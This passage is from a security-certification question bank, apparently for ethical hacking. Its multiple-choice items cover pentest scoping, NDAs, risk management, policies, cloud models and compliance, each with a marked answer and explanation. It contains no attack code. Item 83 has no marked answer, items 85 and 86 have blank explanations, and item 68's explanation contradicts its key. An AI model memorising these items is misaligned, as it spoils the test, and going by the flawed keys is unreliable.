> + Any changes (including patches) could have an impact on the security posture of the department environment due to rules used to establish the systems, especially on servers (this can be more important on critical systems). Staff members assigned to the change management process must approve any changes.

40. An ethical hacker for a large security research firm performs penetration tests, vulnerability tests, and risk assessments. A friend recently started a company and asks the hacker to perform a penetration test and vulnerability assessment of the new company as a favor. What should the hacker’s next step be before starting work on this job?
+ [ ] Use social engineering techniques on the friend's employees to help identify areas that may be susceptible to attack.
+ [ ] Begin the reconnaissance phase with passive information gathering and then move into active information gathering.
+ [ ] Start by footprinting the network and mapping out a plan of attack.
+ [x] Define the penetration testing scope.
> **Explanation:**
> Before starting the penetration testing, it is important to define the penetration testing scope. It is one of the important parts of penetration testing engagement process that helps you gather assessment requirements for your penetration test. It further helps in preparing test plan, limitations, business objectives, and time schedule for the proposed pen test.
> It helps you define clear objectives with the help of which you can identify:
> + What will be tested
> + How it should be tested
> + What resources will be allocated
> + What limitations will be applied
> + What business objectives will be achieved
> + How the test project will be planned and scheduled 

41. Which initial procedure should an ethical hacker perform after being brought into an organization?
+ [ ] Assess what the organization is trying to protect
+ [x] Sign a formal contract with a non-disclosure clause or agreement
+ [ ] Begin security testing.
+ [ ] Turn over deliverables
> **Explanation:**
> + The very first thing an ethical hacker must do is to maintain confidentiality when performing the test and follow a nondisclosure agreement (NDA) with the client for confidential information disclosed during the test. The information gathered might contain sensitive information and the ethical hacker must not disclose any information about the test or confidential company data to a third party.

42. Which of the following can an administrator do to verify that a tape backup can be recovered in its entirety?
+ [ ] Read the first 512 bytes of the tape.
+ [ ] Read the last 512 bytes of the tape.
+ [x] Perform a full restore.
+ [ ] Restore a random file.
> **Explanation:**
> + “in its entirety” means reading the whole tape, not just the first or last 512 bytes or a random file.

43. In order to show improvement of security over time, what must be developed?
+ [ ] Testing tools
+ [ ] Taxonomy of vulnerabilities
+ [ ] Reports
+ [x] Metrics
> **Explanation:**
> + A report is a document that contains information such as tasks rendered by a team, methods used and findings, general and specific recommendations, terms used and their definitions, and information collected from all the phases an activity. A standalone report does not indicate historical improvement in the security posture of an organization.  
> + Testing tools can help in identifying vulnerabilities in the system, but they alone cannot confirm whether the security posture of the organization has improved over time.  
> + Metrics refers to parameters of quantitative assessment used for measurement, comparison, or to track the performance of security controls over a period.  
> + Taxonomy of vulnerabilities refers to the study of the general principles of vulnerabilities classification.

44. A penetration tester is hired to do a risk assessment of a company’s DMZ. The rules of engagement state that the penetration test has to be done from an external IP address with no prior knowledge of the internal IT systems. What kind of test is being performed?
+ [ ] Red box.
+ [ ] Grey box.
+ [x] Black box.
+ [ ] White box.
> **Explanation:**
> + In black box testing, the pen testers have only the company name. The tester after that uses fingerprinting methods to acquire information about the inputs and the expected outputs but is not aware of the internal workings of a system. Testers carry out this test after extensive research of the target organization. Black box testing simulates an external attacker.

45. Which of the following is one of the four critical components of an effective risk assessment?
+ [ ] DMZ.
+ [ ] Physical security.
+ [ ] Logical interface.
+ [x] Administrative safeguards.
> **Explanation:**
> + There are four critical components of an effective risk assessment: technical safeguards, organizational safeguards, physical safeguards, and administrative safeguards.

46. Low humidity in a data center can cause which of the following problems?
+ [ ] Heat
+ [x] Static electricity
+ [ ] Corrosion
+ [ ] Airborne contamination
> **Explanation:**
> + Answer "Static current" is correct; low humidity can cause a buildup of static electricity. Static discharge can damage data and equipment. a, b, and d are incorrect. Corrosion can be caused by high humidity; airborne contaminants are caused by improper air filtration, and heat is caused by improper cooling.

47. Which of the following is an advantage of utilizing security testing methodologies to conduct a security audit?
+ [ ] Anyone can run the command line scripts.
+ [ ] They are available at a low cost.
+ [x] They provide a repeatable framework.
+ [ ] They are subject to government regulation.
> **Explanation:**
> The correct answer is “They provide a valuable framework.”
> Some of the additional benefits of security testing are as follows:
> + ? The ability to detect highly complex vulnerabilities that are not visible without access to the source code.
> + ? The ability to tell you the precise location of any flaw in the source code, including the line number, which greatly simplifies remediation and managing false positives.
> + ? The ability to provide a valuable framework during application development to detect weaknesses before they become security risks for your end users and your organization.

48. The Open Web Application Security Project (OWASP) testing methodology addresses the need to secure web applications by providing which one of the following services?
+ [ ] A security certification for hardened web applications
+ [ ] An extensible security framework named COBIT
+ [ ] Web application patches
+ [x] A list of flaws and how to fix them
> **Explanation:**
> + OWASP is an Open Web Application Security Project that assists organizations to purchase, develop, and maintain software tools, software applications, and knowledge-based documentation for web application security. It provides a set of tools and a knowledge base, which helps in protecting web applications and services. It is beneficial for system architects, developers, vendors, consumers, and security professionals who might work on designing, developing, deploying, and testing the security of web applications and web services.

49. How do employers protect assets with security policies pertaining to employee surveillance activities?
+ [x] Employers provide employees with written statements that clearly discuss the boundaries of monitoring activities and the consequences.
+ [ ] Employers use network surveillance to monitor employee e-mail traffic and network access, and to record employee keystrokes.
+ [ ] Employers promote monitoring activities of employees as long as the employees demonstrate trustworthiness.
+ [ ] Employers use informal verbal communication channels to explain employee monitoring activities to employees.
> **Explanation:**
> + Employers monitor employees’ activities according to the organization’s policies. This includes keeping track of e-mails, files uploads, downloads, history, and hardware information.

50. When does the Payment Card Industry Data Security Standard (PCI-DSS) require organizations to perform external and internal penetration testing?
+ [ ] At least once every two years and after any significant upgrade or modification
+ [ ] At least twice a year or after any significant upgrade or modification
+ [ ] At least once every three years or after any significant upgrade or modification
+ [x] At least once a year and after any significant upgrade or modification
> **Explanation:**
> + The Payment Card Industry Data Security Standard (PCI-DSS) is a proprietary information security standard for organizations that handle cardholder information for the major debit, credit, prepaid, e-purse, ATM, and POS cards. This standard offers robust and comprehensive standards and supporting materials to enhance payment card data security. PCI-DSS applies to all entities involved in payment card processing, including merchants, processors, acquirers, issuers, and service providers, as well as all other entities that store, process, or transmit cardholder data. PCI-DSS comprises a minimum set of requirements for protecting cardholder data.

51. How can a policy help improve an employee’s security awareness?
+ [ ] By sharing security secrets with employees, enabling employees to share secrets, and establishing a consultative helpline
+ [x] By implementing written security procedures, enabling employee security training, and promoting the benefits of security
+ [ ] By decreasing an employee's vacation time, addressing ad hoc employment clauses, and ensuring that managers know employee strengths
+ [ ] By using informal networks of communication, establishing secret passing procedures, and immediately terminating employees
> **Explanation:**
> + Security policies form the foundation of a security infrastructure. Information security policy defines the necessary security requirements and rules to protect and secure an organization’s information systems. Without them, it is impossible to protect the company from possible lawsuits, lost revenue, and bad publicity, not to mention the basic security attacks. A security policy is a high-level document or a set of documents that describes, in detail, the security controls to implement to protect the company.

52. Which of the following examples best represents a logical or technical control?
+ [x] Security tokens.
+ [ ] Smoke and fire alarms.
+ [ ] Corporate security policy.
+ [ ] Heating and air conditioning.
> **Explanation:**
> + Logical controls include the following: access control software, malware solutions, passwords, security tokens, and biometrics. Security tokens are used to authenticate a user to a system. Tokens are hardware devices that can take the form of key fobs or credit cards. They are often used together with another logical access control, such as a password or pin, to implement strong multifactor authentication.

53. A consultant is hired to do a physical penetration test at a large financial company. On the first day of his assessment, the consultant goes to the company’s building dressed as an electrician and waits in the lobby for an employee to pass through the main access gate, and then the consultant follows the employee behind to get into the restricted area. Which type of attack did the consultant perform?
+ [x] Tailgating
+ [ ] Shoulder surfing
+ [ ] Social engineering
+ [ ] Mantrap
> **Explanation:**
> + Tailgating implies access to enter into the building or secured area without the consent of the authorized person. It is the act of following an authorized person through a secure entrance, as when a polite user opens and then holds the door for those following. An attacker wears a fake badge and attempts to enter a secured area by closely following an authorized person through a door requiring key access. He/she can then try to get into restricted areas by pretending to be an authorized person.

54. What is the name of the international standard that establishes a baseline level of confidence in the security functionality of IT products by providing a set of requirements for evaluation?
+ [ ] Blue Book
+ [ ] The Wassenaar Agreement
+ [x] Common Criteria
+ [ ] ISO 26029
> **Explanation:**
> + Common Criteria (CC) is an international set of guidelines and specifications developed for evaluating information security products, specifically to ensure that they meet an agreed-upon security standard for government deployment.

55. Which of the following statements are true regarding N-tier architecture? (Choose two.)
+ [x] Each layer must be able to exist on a physically independent system.
+ [ ] When a layer is changed or updated, the other layers must also be recompiled or modified.
+ [ ] The N-tier architecture must have at least one logical layer.
+ [x] Each layer should exchange information only with the layers above and below it.
> **Explanation:**
> + N-tier architecture is also called multitier architecture because the software is engineered to have the processing, data management, and presentation functions physically and logically separated. This means that these different functions are hosted on several machines or clusters, ensuring that services are provided without resources being shared and, as such, these services are delivered at top capacity. The “N” in the name N-tier architecture refers to any number from 1.

56. Which of the following items is unique to the N-tier architecture method of designing software applications?
+ [ ] Application layers can be written in C, ASP.NET, or Delphi without any performance loss.
+ [ ] Data security is tied into each layer and must be updated for all layers when an upgrade is performed.
+ [x] Application layers can be separated, allowing each layer to be upgraded independently from other layers.
+ [ ] It is compatible with various databases including Access, Oracle, and SQL.
> **Explanation:**
> + N-tier architecture is also called multitier architecture because the software is engineered to have the processing, data management, and presentation functions physically and logically separated. This means that these different functions are hosted on several machines or clusters, ensuring that services are provided without resources being shared and, as such, these services are delivered at top capacity. The “N” in the name N-tier architecture refers to any number from 1.

57. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. There are various types of employees working in the company, including technical teams, sales teams, and work-from-home employees. Highlander takes care of the security patches and updates of official computers and laptops; however, the computers or laptops of the work-from-home employees are to be managed by the employees or their ISPs. Highlander employs various group policies to restrict the installation of any third-party applications. As per Highlander’s policy, all the employees are able to utilize their personal smartphones to access the company email in order to respond to requests for updates. Employees are responsible for keeping their phones up to date with the latest patches. The phones are not used to directly connect to any other resources in the Highlander, Incorporated, network. The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server, and the company uses work folders to synchronize offline copies back to their devices. Apart from Highlander employees, no one can access the cloud service. What type of cloud service is Highlander using?
+ [ ] Hybrid cloud
+ [x] Private cloud
+ [ ] Community cloud
+ [ ] Public loud
> **Explanation:**
> Answer is Private Cloud.
> + **Private Cloud:** A private cloud, also known as internal or corporate cloud, is a cloud infrastructure that a single organization operates solely. The organization can implement the private cloud within a corporate firewall. Organizations deploy private cloud infrastructures to retain full control over corporate data.
> + **Public Cloud:** In this model, the provider makes services such as applications, servers, and data storage available to the public over the Internet. In this model, the cloud provider is liable for the creation and constant maintenance of the public cloud and its IT resources. 
> + **Community Cloud:** It is a multi-tenant infrastructure shared among organizations from a specific community with common computing concerns such as security, regulatory compliance, performance requirements, and jurisdiction. 
> + **Hybrid Cloud:** It is a cloud environment comprised of two or more clouds (private, public, or community) that remain unique entities but bound together for offering the benefits of multiple deployment models.

58. In the software security development lifecycle, threat modeling occurs in which phase?
+ [x] Design
+ [ ] Verification
+ [ ] Requirements
+ [ ] Implementation
> **Explanation:**
> + Design phase involves performing attack surface analysis/reduction and usage of threat modeling. Requirement phase involves establishing security requirements and performing security and privacy risk assessments. Verification phase involves performing dynamic analysis and conducting attack surface review. Implementation phase involves deprecating unsafe functions and performing static analysis.

59. A security policy is more acceptable to employees if it is consistent and has the support of:
+ [ ] Coworkers.
+ [ ] The security officer.
+ [ ] A supervisor.
+ [x] Executive management.
> **Explanation:**
> + Executive management is a team of individuals at the highest level of management in an organization who have the day-to-day tasks of managing that organization. They hold specific executive powers delegated to them with and by the authority of a board of directors and the shareholders. The executive management typically consists of the heads of a firm such as chief financial officer, the chief operating officer, and the chief strategy officer.

60. Which of the following security policy protects the organizational resources and enables organizations to track their assets?
+ [ ] Remote access policy
+ [ ] Information protection policy
+ [x] Access control policy
+ [ ] User account policy
> **Explanation:**
> + **Access Control Policy:** Access control policy outlines procedures that help in protecting the organizational resources and the rules that control access to them. It enables organizations to track their assets. 
> + **Remote-Access Policy:** A remote-access policy contains a set of rules that define authorized connections. It defines who can have remote access, the access medium and remote access security controls. 
> + **User Account Policy:** User account policies provide guidelines to secure access to a system. It defines the account creation process, and authority, rights and responsibilities of user accounts. 
> + **Information-Protection Policy:** Information-protection policies define the standards to reduce the danger of misuse, destruction, and loss of confidential information. It defines the sensitivity levels of information, who may have access, how it is stored and transmitted, and how it should be deleted from storage media.

61. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. There are various types of employees working in the company, including technical teams, sales teams, and work-from-home employees. Highlander takes care of the security patches and updates of official computers and laptops; however, the computers or laptops of the work-from-home employees are to be managed by the employees or their ISPs. Highlander employs various group policies to restrict the installation of any third-party applications. As per Highlander’s policy, all the employees are able to utilize their personal smartphones to access the company email in order to respond to requests for updates. Employees are responsible for keeping their phones up to date with the latest patches. The phones are not used to directly connect to any other resources in the Highlander, Incorporated, network. The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server, and the company uses work folders to synchronize offline copies back to their devices. Highlander, Incorporated, is concerned about their defense in depth. The scope of their concern is especially the users with mobile phones. In order to provide appropriate security, which layer of defense in depth should they focus the most attention on?
+ [ ] Physical.
+ [ ] Internal Network.
+ [x] Policies, Procedures, and Awareness.
+ [ ] Perimeter.
> **Explanation:**
> Highlander, Incorporated, should focus on policies, procedures, and awareness. This is the only layer, of the answers given, that would deal with the phones. Users need to be trained in proper usage and dangers of utilizing their devices. 
> + Physical deals with the facilities. 
> + Perimeter would deal with network access servers. 
> + The phones do not communicate with other internal network resources.

62. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. There are various types of employees working in the company, including technical teams, sales teams, and work-from-home employees. Highlander takes care of the security patches and updates of official computers and laptops; however, the computers or laptops of the work-from-home employees are to be managed by the employees or their ISPs. Highlander employs various group policies to restrict the installation of any third-party applications. As per Highlander’s policy, all the employees are able to utilize their personal smartphones to access the company email in order to respond to requests for updates. Employees are responsible for keeping their phones up to date with the latest patches. The phones are not used to directly connect to any other resources in the Highlander, Incorporated, network. The database that hosts the information collected from the insurance application is hosted on a cloud-based file server, and their email server is hosted on Office 365. Other files created by employees get saved to a cloud-based file server, and the company uses work folders to synchronize offline copies back to their devices. Management at Highlander, Incorporated, has agreed to develop an incident management process after discovering laptops were compromised and the situation was not handled in an appropriate manner. What is the first phase that Highlander, Incorporated, needs to implement within their incident management process?
+ [x] Preparation for Incident Handling and Response.
+ [ ] Classification and Prioritization.
+ [ ] Forensic Investigation.
+ [ ] Containment.
> **Explanation:**
> + Highlander, Incorporated, has to train their staff on the type of incidents they may encounter and how to use appropriate tools before they begin handling actual incidents.
> + Classification and prioritization occurs after an incident has been reported and the severity of the incident is being figured out.
> + Containment happens after the appropriate subject matter experts are notified and advise as to what steps to take.
> + Forensic investigation begins after the initial containment.

63. Which of the following policies provides the guidelines on the processing, storage and transmission of sensitive information?
+ [ ] Acceptable Use Policy.
+ [ ] Server Security Policy.
+ [x] Information Protection Policy.
+ [ ] Network Security Policy.
> **Explanation:**
> + **Information Protection Policy:** Information-protection policies define the standards to reduce the danger of misuse, destruction, and loss of confidential information. It defines the sensitivity levels of information, who may have access, how it is stored and transmitted, and how it should be deleted from storage media. They give guidelines to process, store, and transfer confidential information.
> + **Network Connection Policy:** A network-connection policy defines the set of rules for secure network connectivity, including standards for configuring and extending any part of the network, policies related to private networks, and detailed information about the devices attached to the network.
> + **User Account Policy:** User account policies provide guidelines to secure access to a system. It defines the account creation process, and authority, rights and responsibilities of user accounts. It outlines the requirements for accessing and maintaining the accounts on a system.
> + **Acceptable Use Policy:** Acceptable-use policies consist of some rules decided by network and website owners. This type of policy defines the proper use of computing resources and states the responsibilities of users to protect the information available in their accounts.

64. In which phase of risk management process does an analyst calculate the organization’s risks and estimate the likelihood and impact of those risks?
+ [ ] Risk monitoring and review
+ [ ] Risk identification
+ [x] Risk assessment
+ [ ] Risk treatment
> **Explanation:**
> Risk management is the process of reducing and maintaining risk at an acceptable level by means of a well-defined and actively employed security program It involves identifying, assessing, and responding to the risks by implementing controls to the help the organization manage the potential effects. 
> The four key steps commonly termed as risk management phases are:
> + **Risk Identification:** It is the initial step of the risk management plan. The main aim is to identify the risks - sources, causes, consequences, etc. of the internal and external risks affecting the security of the organization before they cause harm to the organization.
> + **Risk Assessment:** This phase assesses the organization’s risks and estimates the likelihood and impact of those risks. Risk assessment is an ongoing iterative process and assigns priorities for risk mitigation and implementation plans, which help to determine the quantitative and qualitative value of risk.
> + **Risk Treatment:** Risk treatment is the process of selecting and implementing appropriate controls on the identified risks in order to modify them. The risk treatment method addresses and treats the risks, according to their severity level. 
> + **Risk Tracking and Review:** The tracking and review process should determine the measures adopted, the procedures adopted, and ensure that information gathered for undertaking the assessment was appropriate. The review phase evaluates the performance of the implemented risk management strategies.

65. Which of the following processes evaluates the adherence of an organization to its stated security policy?
+ [ ] Vulnerability assessment
+ [ ] Risk assessment
+ [ ] Penetration testing
+ [x] Security auditing
> **Explanation:**
> + A security analyst performs security auditing on the network to determine if there are any deviations from the security policies of an organization.

66. Highlander, Incorporated, is a medical insurance company with several regional company offices in North America. There are various types of employees working in the company, including technical teams, sales teams, and work-from-home employees. Highlander takes care of the security patches and updates of official computers and laptops; however, the computers or laptops of the work-from-home employees are to be managed by the employees or their ISPs. Highlander employs various group policies to restrict the installation of any third-party applications.
As per Highlander’s policy, all the employees are able to utilize their personal smartphones to access the company email in order to respond to requests for updates. Employees are responsible for keeping their phones up to date with the latest patches. The phones are not used to directly connect to any other resources in the Highlander, Incorporated, network. The company is concerned about the potential vulnerabilities that could exist on their devices.
What would be the best type of vulnerability assessment for the employees’ smartphones?
+ [ ] Active Assessment.
+ [ ] Wireless Network Assessment.
+ [x] Host-Based Assessment.
+ [ ] Passive Assessment.
> **Explanation:**
> + **Host-based** assessment looks at the vulnerabilities of the devices.
> + **Active assessment** means we are using a network scanner to look for hosts.
> + **Passive assessment** means we are sniffing packets in a network.
> + **Wireless network assessment** looks for vulnerabilities in the wireless network, not the phone.

67. Company XYZ is one of the most famous and well-known organization across the globe for its cyber security services. It has received Best Cyber Security Certification Provider Award for three consecutive times. One day, a hacker identified severe vulnerability in XYZ’s website and exploited the vulnerabilities in the website successfully compromising customers’ private data. Besides the loss of data and the compromised network equipment, what has been the worst damage for Company XYZ?
+ [ ] Customers.
+ [x] Reputation.
+ [ ] Routers.
+ [ ] Credit Score.
> **Explanation:**
> + Most businesses do not accurately calculate the loss of reputation and its negative financial result. The others are factors that may end up being damaged but not the most damaged.

68. Bayron is the CEO of a medium size company with regional operations in America. He recently hired a security analyst to implement an Information Security Management System (ISMS) to minimize risk and limit the impact of a security breach. The analyst was asked to design and implement patch management, vulnerability management, IDS deployment, and security incident handling procedures for the company. Which of these is a reactive process?
+ [ ] IDS deployment
+ [x] Security Incident Handling
+ [ ] Patch Management
+ [ ] Vulnerability Management
> **Explanation:**
> + The patch and vulnerability management are preventive procedures, so the true answer is A. An incident handling is a reactive one.

69. Which type of security documents provides specific step-by-step details?
+ [ ] Paradigm
+ [ ] Policy
+ [ ] Process
+ [x] Procedure
> **Explanation:**
> + **Process** defines only the main elements in the information security document.
> + **Procedure** captures those elements and adds functionalities, objectives, standards, etc. by providing step-by-step documentation.
> + **Security policy** is a high-level document or set of documents that maintains confidentiality, availability, integrity, and asset values.
> + **Paradigm** is a distinct set of concepts or thought patterns, including theories, research methods, postulates, and standards for what constitutes legitimate contributions to a field.’

70. What is the purpose of conducting security assessments on network resources?
+ [ ] Management
+ [ ] Implementation
+ [x] Validation
+ [ ] Documentation
> **Explanation:**
> + Documentation is the process of recording information on paper, online, or on digital or analog media and using it later as a reference. Implementation is the process of executing a plan. Management deals with organizing, planning, and controlling the resources of a firm. Security assessments are conducted to validate the resources and trace out the vulnerabilities.

71. Which United States legislation mandates that the chief executive officer (CEO) and the chief financial officer (CFO) must sign statements verifying the completeness and accuracy of financial reports?
+ [ ] Gramm-Leach-Bliley Act (GLBA)
+ [ ] Fair and Accurate Credit Transactions Act (FACTA)
+ [ ] Federal Information Security Management Act (FISMA)
+ [x] Sarbanes-Oxley Act (SOX)
> **Explanation:**
> + The Sarbanes-Oxley Act (SOX) aims to protect investors and the public by increasing the accuracy and reliability of corporate disclosures. This act does not explain how an organization needs to store records, but describes records that organizations need to store and the duration of the storage. The act mandated a number of reforms to enhance corporate responsibility, enhance financial disclosures, and combat corporate and accounting fraud.

72. A network administrator is promoted as chief security officer at a local university. One of his new responsibilities is to manage the implementation of an RFID card access system to a new server room on campus. The server room will house student enrollment information that is securely backed up to an off-site location.  
During a meeting with an outside consultant, the chief security officer explains that he is concerned that the existing security controls have not been designed properly. Currently, the network administrator is responsible for approving and issuing RFID card access to the server room, as well as reviewing the electronic access logs on a weekly basis.  
Which of the following is an issue with the situation?
+ [x] Segregation of duties
+ [ ] Lack of experience
+ [ ] Undue influence
+ [ ] An inadequate disaster recovery plan
> **Explanation:**
> + Separation of duties (SoD) is the concept of having more than one person required to complete a task. In business, the separation, by sharing of more than one individual in one single task, is an internal control intended to prevent fraud and error.

73. Which vital role does the U.S. Computer Security Incident Response Team (CSIRT) provide?
+ [x] 24x7 CSIRT Services to any user, company, government agency, or organization.
+ [ ] Maintenance of the nation’s Internet infrastructure, builds out new Internet infrastructure, and decommissions old Internet infrastructure.
+ [ ] Registration of critical penetration testing for the Department of Homeland Security and public and private sectors.
+ [ ] Measurement of key vulnerability assessments on behalf of the Department of Defense (DoD) and State Department, as well as private sectors.
> **Explanation:**
> + CSIRT provides 24x7 CSIRT Services to any user, company, government agency or organization. It provides a reliable and trusted single point of contact for reporting computer security incidents worldwide. CSIRT provides the means for reporting incidents and for disseminating important incident-related information.

74. When utilizing technical assessment methods to assess the security posture of a network, which of the following techniques would be most effective in determining whether end-user security training would be beneficial?
+ [ ] Application security testing.
+ [ ] Vulnerability scanning.
+ [ ] Network sniffing.
+ [x] Social engineering.
> **Explanation:**
> + Social engineering is an art of manipulating people to divulge sensitive information to perform some malicious action. Despite security policies, attackers can compromise organization’s sensitive information using social engineering as it targets the weakness of people. Most often, employees are not even aware of a security lapse on their part and reveal organization’s critical information inadvertently.
> + Employees can be ignorant about social engineering tricks used by an attacker to lure them into divulging sensitive data about the organization. Therefore, the minimum responsibility of any organization is to educate their employees about social engineering techniques and the threats associated with them to prevent social engineering attacks.

75. International Organization for Standardization (ISO) standard 27002 provides guidance for compliance by outlining
+ [x] Guidelines and practices for security controls
+ [ ] Financial soundness and business viability metrics
+ [ ] Standard best practice for configuration management
+ [ ] Contract agreement writing standards
> **Explanation:**
> + According to https://www.iso.org/standard/54533.html, ISO/IEC 27002:2013 gives guidelines for organizational information security standards and information security management practices including the selection, implementation, and management of controls taking into consideration the organizations information security risk environment(s).

76. Which of the following guidelines or standards governs the credit card industry?
+ [ ] Health Insurance Portability and Accountability Act (HIPAA)
+ [x] Payment Card Industry Data Security Standards (PCI DSS)
+ [ ] Sarbanes-Oxley Act (SOX)
+ [ ] Control Objectives for Information and Related Technology (COBIT)
> **Explanation:**
> + Control Objectives for Information and Related Technology (COBIT): According to ISACA “The COBIT 5 framework for the governance and management of enterprise IT is a leading-edge business optimization and growth roadmap that leverages proven practices, global thought leadership and ground-breaking tools to inspire IT innovation and fuel business success.”
> + Sarbanes-Oxley Act (SOX): According to https://www.sec.gov, the Act mandates a number of reforms to enhance corporate responsibility, enhance financial disclosures, and combat corporate and accounting fraud, and created the "Public Company Accounting Oversight Board," also known as the PCAOB, to oversee the activities of the auditing profession.
> + Health Insurance Portability and Accountability Act (HIPAA): According to https://www.hhs.gov, HIPAA protects health insurance coverage for workers and their families when they change or lose their jobs and establishes the national standards for electronic healthcare transactions and national identifiers for providers, health insurance plans, and employers.
> + Payment Card Industry Data Security Standards (PCI DSS): According to https://www.pcisecuritystandards.org, the Payment Card Industry Data Security Standard (PCI DSS) was developed to encourage and enhance cardholder data security and facilitate the broad adoption of consistent data security measures globally. PCI DSS provides a baseline of technical and operational requirements designed to protect account data.

77. To reduce the attack surface of a system, administrators should perform which of the following processes to remove unnecessary software, services, and insecure configuration settings?
+ [ ] Stealthing
+ [ ] Harvesting
+ [ ] Windowing
+ [x] Hardening
> **Explanation:**
> + The goal of hardening is to eliminate as many risks and threats to a computer system as necessary. Some of the hardening activities for a computer system can include the following: keeping security patches and hotfixes updated, monitoring security bulletins that apply to a system’s operating system and applications, installing a firewall, closing specific ports such as server ports, not allowing file sharing among programs, and so on.

78. Cristine is the CEO of a global corporation that has several branch offices around the world. The company employs over 300 workers, half of whom use computers. Recently, the company suffered from a ransomware attack that disrupted many services, and many people have written to Cristine with questions about why it happened She asks Edwin, the systems administrator, about servers that have encrypted information. Edwin explains to Cristine that the servers have a screen asking about bitcoins to pay to decrypt the information, but he does not know why. What team does the company lack?
+ [ ] unencrypt team.
+ [x] CSIRT.
+ [ ] Vulnerability Management team.
+ [ ] Administrators team.
> **Explanation:**
> + The company does not have a computer incident response team and lacks knowledge regarding information security issues. No other team but CSIRT can help with the problem.

79. Which of the following is considered an acceptable option when managing a risk?
+ [ ] Reject the risk.
+ [ ] Deny the risk.
+ [ ] Initiate the risk.
+ [x] Mitigate the risk.
> **Explanation:**
> + Risk management is the process of reducing and maintaining risk at an acceptable level by means of a well-defined and actively employed security program.
> + In risk management process, rejecting and denying the risk are not acceptable options, as they do not deal with any element of risk. Initiation is the primary phase of risk management where a general risk management strategy is defined, but it has nothing to do practically for dealing with risks.
> + Mitigation involves minimizing the risk of a threat or vulnerability by performing certain actions or by implementing direct or competing controls. Therefore, mitigate the risk is an acceptable option because it eliminates or reduces the risk of a threat or vulnerability completely.

80. Which security control role does encryption meet?
+ [x] Preventative Controls
+ [ ] Both detective and corrective controls
+ [ ] Detective Controls
+ [ ] Corrective controls
> **Explanation:**
> + Preventive control is that which strengthens the system against incidents, probably by minimizing or eliminating vulnerabilities. Strong authentication mechanisms like encryptions come under preventive controls

81. Which security strategy requires using several, diverse methods to protect IT systems against attacks?
+ [ ] Three-way handshake
+ [ ] Covert channels
+ [x] Defense in depth
+ [ ] Exponential backoff algorithm
> **Explanation:**
> + Defense in depth is a security strategy in which several protection layers are placed throughout an information system. This strategy uses the military principle that it is more difficult for an enemy to defeat a complex and multilayered defense system than to penetrate a single barrier. Defense in depth helps to prevent direct attacks against an information system and its data because a break in one layer leads the attacker only to the next layer.

82. Which method can provide a better return on IT security investment and provide a thorough and comprehensive assessment of organizational security covering policy, procedure design, and implementation?
+ [ ] Social engineering
+ [x] Penetration testing
+ [ ] Vulnerability scanning
+ [ ] Access control list reviews
> **Explanation:**
> + **Penetration testing:** Penetration testing is a methodological approach to security assessment that encompasses the security audit and vulnerability assessment and demonstrates if the vulnerabilities in system can be successfully exploited by attackers. It reduces an organization’s expenditure on IT security and enhancing Return on Security Investment (ROSI) by identifying and remediating vulnerabilities or weaknesses.
> **Social engineering:** Social Engineering is a process of convincing a victim to run an executable that they should not.
> **Vulnerability scanning:** Vulnerability scanning is an inspection of the potential points of exploit on a computer or network to identify security holes.
> **Access control list reviews:** An access control list (ACL) is a table that tells a computer operating system which access rights each user has to a particular system object, such as a file directory or an individual file.

83. Which of these is a preventive security control?
Disaster recovery
Vulnerability management
Forensics
Security incident handling
> **Explanation:**
> The preventive controls/processes basically consist of methods or techniques that help in avoiding incident.
> Examples of preventive processes:
> + Patch management
> + Vulnerability management
> + IDS deployment
> 
> The reactive controls basically consist of methods or techniques that help in responding to the incident.
> Examples of reactive processes:
> + Incident handling
> + Forensics
> + Disaster recovery


84. Which type of scan is used on the eye to measure the layer of blood vessels?
+ [ ] Signature kinetics scan
+ [ ] Facial recognition scan
+ [x] Retinal scan
+ [ ] Iris scan
> **Explanation:**
> + **Facial recognition scan:** Identifies or verifies a person from a digital image by comparing and analyzing patterns.
> + **Retinal scan:** Compares and identifies a user using the distinctive patterns of retina blood vessels.
> + **Iris scan:** Identifies people based on unique patterns within the ring-shaped region surrounding the pupil of the eye.
> + **Signature kinetics scan:** Analyzes and measures the physical activity of signing like the pressure applied, stroke order, and the speed.

85. You are the security administrator of Xtrinity, Inc. You write security policies and conduct assessments to protect the company’s network. During one of your periodic checks to see how well policy is being followed by the employees, you discover that an employee has attached his laptop to his personal 4G Wi-Fi device. He has used this 4G connection to download certain files from the Internet, thereby bypassing your firewall. A security policy breach has occurred as a direct result of this activity. The employee explains that he used the modem because he had to download software for a department project. How would you resolve this situation?
+ [ ] Install a network-based IDS.
+ [ ] Conduct a needs analysis.
+ [x] Enforce the corporate security policy.
+ [ ] Reconfigure the firewall.
> **Explanation:**
> + 

86. What are the three types of compliances that the Open-Source Security Testing Methodology Manual (OSSTMM) recognizes?
+ [ ] Legal, performance, audit.
+ [x] Legislative, contractual, standards-based.
+ [ ] Contractual, regulatory, industry.
+ [ ] Audit, standards-based, regulatory.
> **Explanation:**
> + 


## Ethical Hacking Concepts and Scope
87. A certified ethical hacker (CEH) completed a penetration test of the main headquarters of a company almost two months ago but has yet to get paid. The customer is suffering from financial problems, and the CEH is worried that the company will go out of business and end up not paying. What actions should the CEH take?
+ [ ] Threaten to publish the penetration test results if not paid.
+ [ ] Exploit some of the vulnerabilities found on the company webserver to deface it.
+ [ ] Tell other customers of the financial problems with payments from this company.
+ [x] Follow proper legal procedures against the company to request payment.
> **Explanation:**
> + Option “Follow proper legal procedures against the company to request payment” is correct. He can use the pen testing contracts (non-disclosure clause, fees and project schedule, etc.) for legal procedure to request payment.
> + Other options are not correct, because as per NDA, he cannot disclose any trade secrets, patents, or other proprietary information to anyone outside the company.

88. A CEH is approached by a friend who believes her husband is cheating. She offers to pay to break into her husband’s email account in order to find proof so she can take him to court. What is the ethical response?
+ [ ] Say yes; do the job for free.
+ [ ] Say no; make sure that the friend knows the risk she’s asking the CEH to take.
+ [x] Say no; the friend is not the owner of the account.
+ [ ] Say yes; the friend needs help to gather evidence.
> **Explanation:**
> + In the above scenario, a friend is asking the CEH to gain unauthorized or inappropriate access to the email account of her husband in order to find proof so she can take him to court. Gaining unauthorized access to other account without his permission is illegal. Punishments for such illegal things are harsh and include fine, jail sentence, or both. So, the best option is to say no, as the friend is not the owner of the account.

